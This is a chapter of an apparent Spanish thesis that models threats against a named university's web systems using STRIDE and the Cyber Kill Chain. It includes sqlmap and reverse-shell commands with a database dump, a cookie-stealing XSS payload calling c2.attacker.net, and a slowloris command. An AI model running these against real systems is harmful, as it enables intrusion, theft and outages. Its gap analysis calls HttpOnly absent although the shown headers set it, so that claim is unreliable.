\chapter{Desarrollo y Aplicación Práctica}
\label{ch:aplicacion_practica}

A continuación, se desarrolla la evaluación experimental y el modelado sistemático sobre la infraestructura web seleccionada de la Universidad Nacional del Altiplano (UNAP).

\section{Reconocimiento del Entorno Autorizado}
El proceso de evaluación inició con la recolección de información pública y la identificación de la superficie expuesta en el dominio institucional \texttt{unap.edu.pe}. Esta etapa permite conocer la topología lógica sin enviar paquetes invasivos ni generar alertas de intrusión.

\subsection{Inspección de Resolución DNS y Certificados}
Mediante herramientas estándar de auditoría de red, se determinaron los registros DNS autoritativos, subdominios públicos y la infraestructura de servidores de nombres que soportan la operación de la universidad:

\begin{cmdbox}{Auditoría de Registros DNS y Mapeo de Subdominios (OSINT)}
# Consulta de servidores de nombres (NS) y registros MX
host -t ns unap.edu.pe
unap.edu.pe name server ns1.unap.edu.pe.
unap.edu.pe name server ns2.unap.edu.pe.

# Deteccion de subdominios institucionales expuestos
sublist3r -d unap.edu.pe -o subdominios_unap.txt
[-] Searching in Baidu, Yahoo, Google, Bing, Ask, Netcraft, Virustotal...
[+] Found Unique Subdomains:
    sia.unap.edu.pe
    vcampus.unap.edu.pe
    admision.unap.edu.pe
    api.unap.edu.pe
    biblioteca.unap.edu.pe
\end{cmdbox}

\subsection{Inspección de Cabeceras HTTP y Cifrado TLS}
Se ejecutó un análisis no intrusivo sobre el servidor web que hospeda el portal del SIA (\texttt{sia.unap.edu.pe}) para verificar las políticas de seguridad implementadas en las cabeceras HTTP y la vigencia criptográfica del protocolo TLS:

\begin{cmdbox}{Inspección de Cabeceras de Seguridad y Configuración TLS}
curl -I -s https://sia.unap.edu.pe
HTTP/1.1 200 OK
Date: Wed, 16 Sep 2026 21:30:00 GMT
Server: nginx/1.20.1
X-Powered-By: PHP/7.4.30
Set-Cookie: PHPSESSID=d9a8f4c1e6b30129a; path=/; HttpOnly; SameSite=Lax
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
\end{cmdbox}

\begin{remark}
El análisis de cabeceras evidencia el uso de un servidor Nginx con PHP en el backend. Aunque se observan cabeceras de protección esenciales como \texttt{Strict-Transport-Security} (HSTS) y \texttt{X-Frame-Options}, la exposición explícita de la versión de PHP y Nginx proporciona a un atacante potencial información valiosa sobre versiones y posibles vectores de explotación.
\end{remark}

\section{Identificación y Catalogación de Activos Críticos}
Para estructurar el modelado de amenazas, se categorizaron los cinco activos web más representativos del alcance institucional de la UNAP:

\begin{center}
\small
\begin{longtable}{>{\bfseries}c p{3.2cm} p{3.6cm} p{2.5cm} p{2.8cm}}
\toprule
\rowcolor{outermarginbgcolor}
ID & Nombre del Activo & Función Principal & Stack Tecnológico & Criticidad \\
\midrule
\endfirsthead
\toprule
\rowcolor{outermarginbgcolor}
ID & Nombre del Activo & Función Principal & Stack Tecnológico & Criticidad \\
\midrule
\endhead
\bottomrule
\endfoot
A01 & Sistema Académico (SIA) & Registro de notas, actas oficiales y carga de matrícula. & PHP / Nginx / PostgreSQL & \textbf{Crítica (Alta)} \\
\midrule
A02 & Campus Virtual (Moodle) & Plataforma de aprendizaje, exámenes y tareas virtuales. & PHP / Apache / MySQL & \textbf{Alta} \\
\midrule
A03 & Pasarela Admisión & Inscripción a exámenes de admisión y validación de pagos. & React / Node.js / Oracle DB & \textbf{Crítica (Alta)} \\
\midrule
A04 & API Institucional & Servicio REST para sincronización de datos con app móvil. & Python (FastAPI) / Redis & \textbf{Media-Alta} \\
\midrule
A05 & Base de Datos Matrícula & Almacén centralizado de expedientes estudiantiles. & PostgreSQL Cluster & \textbf{Crítica (Máxima)} \\
\bottomrule
\end{longtable}
\end{center}

\section{Aplicación de la Metodología STRIDE}
A continuación, se presenta la matriz integral de amenazas obtenida al someter los activos catalogados a las seis dimensiones de STRIDE:

\begin{center}
\footnotesize
\begin{longtable}{>{\bfseries}c >{\bfseries}c p{3.8cm} p{3.8cm} p{3.5cm}}
\toprule
\rowcolor{outermarginbgcolor}
Activo & STRIDE & Amenaza Específica Identificada & Impacto Potencial & Control Defensivo Recomendado \\
\midrule
\endfirsthead
\toprule
\rowcolor{outermarginbgcolor}
Activo & STRIDE & Amenaza Específica Identificada & Impacto Potencial & Control Defensivo Recomendado \\
\midrule
\endhead
\bottomrule
\endfoot
A01 (SIA) & S & Suplantación de identidad docente mediante robo de credenciales o fuerza bruta. & Registro y alteración no autorizada de calificaciones. & Implementación de MFA obligatorio y bloqueo por reintentos. \\
\midrule
A01 (SIA) & T & Modificación de actas académicas mediante Inyección SQL (SQLi) en formularios de búsqueda. & Pérdida total de la integridad en los registros académicos. & Consultas preparadas (\textit{Prepared Statements}) y WAF. \\
\midrule
A02 (LMS) & R & Docente o alumno borra examen y niega la acción ante falta de bitácora detallada. & Imposibilidad de auditoría y disputas legales/académicas. & Logs inmutables centralizados en SIEM con firma criptográfica. \\
\midrule
A03 (Adm) & I & Divulgación de datos personales (DNI, teléfono, dirección) mediante vulnerabilidad IDOR. & Violación de la Ley 29733 de Datos Personales. & Verificación estricta de autorización basada en roles (RBAC). \\
\midrule
A03 (Adm) & D & Inundación HTTP masiva en día de cierre de inscripciones al examen de admisión. & Colapso del portal, quejas masivas y pérdidas económicas. & Protección anti-DDoS en capa de borde (ej. Cloudflare / Rate Limiting). \\
\midrule
A04 (API) & E & Escalado de privilegios de usuario estándar a administrador vía parámetro JSON manipulado. & Control total de endpoints de gestión institucional. & Validación estricta de esquemas JSON y principio de menor privilegio. \\
\bottomrule
\end{longtable}
\end{center}

\section{Construcción y Modelado de Escenarios de Ataque}
A partir de las amenazas priorizadas en el modelo STRIDE, se formalizaron tres escenarios representativos de intrusión para la UNAP:

\subsection{Escenario 1: Exfiltración de Base de Datos y Alteración en el SIA vía SQLi}
Este escenario modela a un atacante externo que explota una inyección SQL ciega en el módulo de consulta del SIA (\texttt{sia.unap.edu.pe}), obtiene credenciales de administrador y deposita una webshell para exfiltrar las bases de datos.

\subsubsection{Fases de la Cyber Kill Chain (Escenario 1)}
\begin{enumerate}
    \item \textbf{Reconocimiento:} Escaneo de puertos y servicios con Nmap sobre \texttt{sia.unap.edu.pe}.
    \item \textbf{Armamento:} Construcción de carga útil de inyección SQL booleana para volcado de usuarios.
    \item \textbf{Entrega:} Envío del payload malicioso vía peticiones POST parametrizadas.
    \item \textbf{Explotación:} Ejecución de consultas no sanitizadas en la base de datos PostgreSQL.
    \item \textbf{Instalación:} Carga de una webshell criptográfica en el directorio \texttt{/uploads/}.
    \item \textbf{Comando y Control (C2):} Conexión inversa cifrada por el puerto 443 hacia la IP del atacante.
    \item \textbf{Acciones sobre el Objetivo:} Extracción del volcado \texttt{dump\_unap\_sia.sql} y alteración de notas.
\end{enumerate}

\begin{cmdbox}{Escenario 1: Ejecución de Explotación y Acceso Remoto (SQLMap + Ncat)}
# 1. Extraccion automatizada con SQLMap
sqlmap -u "https://sia.unap.edu.pe/api/consulta_alumno.php" \
       --data="id_alumno=1024" --dbs --batch --threads=4

# 2. Establecimiento de Reverse Shell en servidor C2
ncat -lvnp 443
Connection received from 200.48.xxx.xxx:51280.
uid=33(www-data) gid=33(www-data)
whoami && pg_dump -U postgres -h localhost db_sia_academico > dump_sia.sql
\end{cmdbox}

\subsection{Escenario 2: Secuestro de Sesión Docente en el Campus Virtual vía Stored XSS}
Este escenario modela a un alumno malicioso que inyecta código JavaScript malicioso en un foro de discusión de Moodle (\texttt{vcampus.unap.edu.pe}). Cuando el docente revisa el foro, el script se ejecuta en su navegador y transmite su cookie de sesión al servidor del atacante.

\subsubsection{Fases de la Cyber Kill Chain (Escenario 2)}
\begin{enumerate}
    \item \textbf{Reconocimiento:} Inspección del editor de texto enriquecido en los foros del Campus Virtual.
    \item \textbf{Armamento:} Creación de un script JavaScript ofuscado que capture \texttt{document.cookie}.
    \item \textbf{Entrega:} Publicación del mensaje en el foro con la etiqueta \texttt{<script>} oculta en una imagen.
    \item \textbf{Explotación:} El navegador del docente renderiza el HTML y ejecuta el payload de forma invisible.
    \item \textbf{Instalación:} Inyección de un escuchador en el DOM para capturar credenciales adicionales.
    \item \textbf{Comando y Control:} El script envía la cookie \texttt{MoodleSession} vía HTTP GET al atacante.
    \item \textbf{Acciones sobre el Objetivo:} El atacante clona la sesión, ingresa como docente y aprueba exámenes.
\end{enumerate}

\begin{cmdbox}{Escenario 2: Payload XSS y Servidor de Captura de Cookies}
# Payload inyectado en el cuerpo del mensaje del foro:
<img src="x" onerror="fetch('https://c2.attacker.net/log?c='+btoa(document.cookie))">

# Registro capturado en el servidor del atacante:
[HTTP GET] /log?c=TW9vZGxlU2Vzc2lvbj1kOTBhOGY0YzFlNmIzMDEyOWE...
[+] Cookie decodificada: MoodleSession=d90a8f4c1e6b30129a; User=Docente_Titular
\end{cmdbox}

\subsection{Escenario 3: Denegación de Servicio en Admisión vía HTTP Slowloris}
Un grupo de ciberatacantes lanza un ataque de agotamiento de recursos en la capa de aplicación (Layer 7) contra la pasarela de pagos de admisión (\texttt{admision.unap.edu.pe}) durante la última hora del cronograma de inscripciones.

\subsubsection{Fases de la Cyber Kill Chain (Escenario 3)}
\begin{enumerate}
    \item \textbf{Reconocimiento:} Determinación de los límites de timeout del servidor Apache/Nginx.
    \item \textbf{Armamento:} Configuración de una botnet ligera con la herramienta \texttt{slowloris.py}.
    \item \textbf{Entrega:} Envío de miles de peticiones HTTP con cabeceras incompletas enviadas lentamente.
    \item \textbf{Explotación:} Agotamiento de la tabla de conexiones y del pool de \textit{workers} de Nginx.
    \item \textbf{Instalación / Persistencia:} Mantenimiento periódico del flujo para evitar que los sockets se liberen.
    \item \textbf{C2:} Coordinación de los nodos atacantes mediante un canal IRC / Telegram bot.
    \item \textbf{Acciones sobre el Objetivo:} Caída del portal de admisión (\textit{HTTP 504 Gateway Timeout}), impidiendo el pago y registro de postulantes.
\end{enumerate}

\begin{cmdbox}{Escenario 3: Simulación de Ataque DoS de Agotamiento de Conexiones}
# Ejecucion del ataque Slowloris contra el puerto HTTPS
slowloris admision.unap.edu.pe -p 443 -s 1500 --sleeptime 10

[INFO] Sending keep-alive headers to 1500 sockets...
[WARNING] Target server response time degraded: > 12000 ms
[ALERT] Server returned HTTP 504 Gateway Timeout / Server Unavailable
\end{cmdbox}

\section{Análisis de Controles Existentes y Brechas de Seguridad}
El desglose de los tres escenarios demuestra que la infraestructura presenta brechas en cuatro niveles fundamentales:
\begin{itemize}
    \item \textbf{Falta de WAF y Reglas de Sanitización:} Permite el paso directo de firmas SQLi y XSS.
    \item \textbf{Ausencia de Flag HttpOnly / SameSite:} Facilita la exfiltración de cookies por scripts JavaScript.
    \item \textbf{Inexistencia de Rate Limiting:} Permite el secuestro de sockets y ataques DoS de capa 7.
    \item \textbf{Falta de Egress Filtering:} Permite a servidores web establecer conexiones salientes a Internet no restringidas.
\end{itemize}
